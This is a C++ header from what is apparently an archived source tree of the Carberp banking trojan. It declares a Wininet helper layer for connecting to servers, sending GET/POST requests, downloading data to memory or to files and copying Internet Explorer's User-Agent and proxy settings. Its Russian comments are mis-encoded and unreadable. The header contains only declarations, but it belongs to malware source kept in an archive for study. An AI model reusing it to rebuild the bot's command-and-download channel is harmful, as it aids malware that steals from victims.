/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#pragma once
/*
  ����������� ��� ������ � Wininet.
*/

//������������ ����� ������ ���������� ��� ��������� � ������.
#define WININET_MAXBYTES_TO_MEM  (10 * 1024 * 1024)

#include "mem.h"

namespace Wininet
{
  //��������� ��� CallURL.
  typedef struct
  {
    bool bAutoProxy;                   //��������� ������� ����������� � WICF_USE_IE_PROXY, ����� ��� ����, ��� ������ �������.
    BYTE bTryCount;                    //���������� �������, ��� ������� ������ ���� 1.
    DWORD dwRetryDelay;                //�������� ���� �������������.
    HANDLE hStopEvent;                 //������ ����������.
    LPSTR pstrUserAgent;               //UserAgent.
    LPSTR pstrURL;                     //URL.

    DWORD Connect_dwFlags;             //����� WICF_*. 

    LPSTR SendRequest_pstrReferer;     //�������
    void *SendRequest_pPostData;       //����-������.
    DWORD SendRequest_dwPostDataSize;  //������ ���-������.
    DWORD SendRequest_dwFlags;         //����� WISRF_*.

    DWORD DownloadData_dwSizeLimit;    //����� �� ����������� ������.
    LPWSTR DownloadData_pstrFileName;  //���� �� ����� NULL, �� ���������� ������ ���������� � ���� ����.
  }CALLURLDATA;

  //����� ��� _Connect.
  enum
  {
    WICF_USE_IE_PROXY = 0x1 //������������ �� ��� ����������� ������ �� �������� IE.
  };

  //����� ��� SendRequest.
  enum
  {
    WISRF_METHOD_GET      = 0x0, //������������ ����� GET. (DEFAULT)
    WISRF_METHOD_POST     = 0x1, //������������ ����� POST.
    WISRF_KEEP_CONNECTION = 0x2, //��������� ���������� ����� ����������� �������. ������ ����� ��
                                 //����������� ���������� ����������, ��� ������� �� �������.
    WISRF_IS_HTTPS        = 0x4 //������ ������ ����������� �� HTTPS ���������.
  };

  /*
    �������������.
  */
  void Init(void);

  /*
    ���������������.
  */
  void Uninit(void);

  /*
    ����������� � ������� �� HTTP/HTTPS ���������.

    IN pstrUserAgent - User-Agent, ���� NULL, �� ������������� �������� �� ���������.
    IN pstrHost      - ����� �������, IP ��� �����.
    IN wPort         - ���� �������.
    IN dwFlags       - ����� WICF_*.

    Return           - ����� ���������� ��� NULL.
  */
  HINTERNET _Connect(LPSTR pstrUserAgent, LPSTR pstrHost, WORD wPort, DWORD dwFlags);

  /*
    �������� ����������, ��������� ��� ������ _Connect.

    IN hConnect - ����� ����������.
  */
  void _CloseConnection(HINTERNET hConnect);

  /*
    �������� ������, � ���� ��� ���������.

    IN OUT handle - �����.
  */
  void _closeWithParents(HINTERNET handle);

  /*
    ����� InternetStatusCallback.

    ... -  �������� InternetStatusCallback.

    Return - true - ������� �������,
             false - ������� �� �������.
  */
  bool callCallback(HINTERNET handle, DWORD_PTR context, DWORD internetStatus, LPVOID statusInformation, DWORD statusInformationLength);

  /*
    �������� �������.

    IN hConnect       - ����� ����������.
    IN pstrURI        - ������������� ������.
    IN pstrReferer    - ������� ��� NULL.
    IN pPostData      - ���� ������ ��� NULL.
    IN dwPostDataSize - ������ pPostData.
    IN dwFlags        - ����� WISRF_*.

    Return            - � ������ ������ ����� ��������� �� HttpOpenRequest, ��� NULL � ������ ������.
  */
  HINTERNET _SendRequest(HINTERNET hConnect, LPSTR pstrURI, LPSTR pstrReferer, void *pPostData, DWORD dwPostDataSize, DWORD dwFlags);

  /*
    ���������� ������.

    IN hRequest    - ����� �������.
    OUT pBuf       - ������ ��� ������, ����� ������������� ���������� ������� ����� Mem. �����
                     ���� NULL.
    IN dwSizeLimit - ����� ����������� ����, ���� ����� 0 ��� ������ WININET_MAXBYTES_TO_MEM, ��
                     dwSizeLimit =  WININET_MAXBYTES_TO_MEM;
    IN hStopEvent  - ����� ������� ��� ���������� ���������� ��� NULL.

    Return         - true - � ������ ������,
                     false - � ������ ������, � ��� ����� ������������� hStopEvent � ����������
                     dwSizeLimit. ���� �������� ������, �� ���������� ���������� �������.
  */
  bool _DownloadData(HINTERNET hRequest, MEMDATA *pBuf, DWORD dwSizeLimit, HANDLE hStopEvent);
  
  /*
    ���������� ������ � ����.

    IN hRequest     - ����� �������.
    IN pstrFileName - ��� �����, � ������� ����� ��������� ������.
    IN dwSizeLimit  - ����� ����������� ����, ���� ����� 0, �� ����������� ���.
    IN hStopEvent   - ����� ������� ��� ���������� ���������� ��� NULL.

    Return          - true - � ������ ������,
                      false - � ������ ������, � ��� ����� ������������� hStopEvent ��� ����������
                      dwSizeLimit. ���� �������� ������, �� ���������� ���������� �������.
  */
  bool _DownloadDataToFile(HINTERNET hRequest, LPWSTR pstrFileName, DWORD dwSizeLimit, HANDLE hStopEvent);

  /*
    �������� ��� _Connect + _SendRequest + _DownloadData(ToFile).

    IN pcud  - ��������� URL;
    OUT pBuf - ������ ��� ������, ����� ������������� ���������� ������� ����� Mem. ����� ���� NULL.
               ��� pcud->DownloadData_pstrFileName != NULL �� ����� ������.

    Return   - true - � ������ ������,
               false - � ������ ������.
  */
  bool _CallURL(CALLURLDATA *pcud, MEMDATA *pBuf);

  /*
    ��������� User-Agent �� Internet Explorer.

    Return - User-Agent, ��� NULL � ������ ������. ������ ������ ���� ����������� ����� Mem.
  */
  LPSTR _GetIEUserAgent(void);

  /*
    ���� �������� �������� URL.

    IN url       - URL.
    IN stopEvent - ������� ��������� ��� NULL.

    Return       - ���������� ����� � ms, ��� 0 - � ������ ������.
  */
  DWORD _testDownloadDelay(LPSTR url, HANDLE stopEvent);

  /*
    ��������� ��� InternetQueryOptionA � �������������� ������.

    IN internet - �����.
    IN option   - �����.
    OUT lenght  - ������ ������. ���� ��� ������, ������ ����� �������� ��� ��������� �������.

    Return      - ������ (����� ���������� ����� Mem), ���� ��� ������, �� �� ����� � ���������� ��
                  ������� ������. ��� NULL � ������ ������.
  */
  void *_queryOptionExA(HINTERNET internet, DWORD option, LPDWORD lenght);

  /*
    ��������� ��� InternetQueryOptionW � �������������� ������.

    IN internet - �����.
    IN option   - �����.
    OUT lenght  - ������ ������ � ������. ���� ��� ������, ������ ����� �������� ��� ��������� �������.

    Return      - ������ (����� ���������� ����� Mem), ���� ��� ������, �� �� ����� � ���������� ��
                  ������� ������. ��� NULL � ������ ������.
  */
  void *_queryOptionExW(HINTERNET internet, DWORD option, LPDWORD lenght);

  /*
    ��������� ��� HttpQueryInfoA � �������������� ������.

    IN internet  - �����.
    IN infoLevel - ����� ����������� ������ ��� ���������.
    OUT lenght   - ������ ������ ��� �������� �������.

    Return      - ������ � ���������� �� ������� ������ (����� ���������� ����� Mem), 
                  ��� NULL � ������ ������.
  */
  LPSTR _queryInfoExA(HINTERNET request, DWORD infoLevel, LPDWORD lenght, LPDWORD index);
};
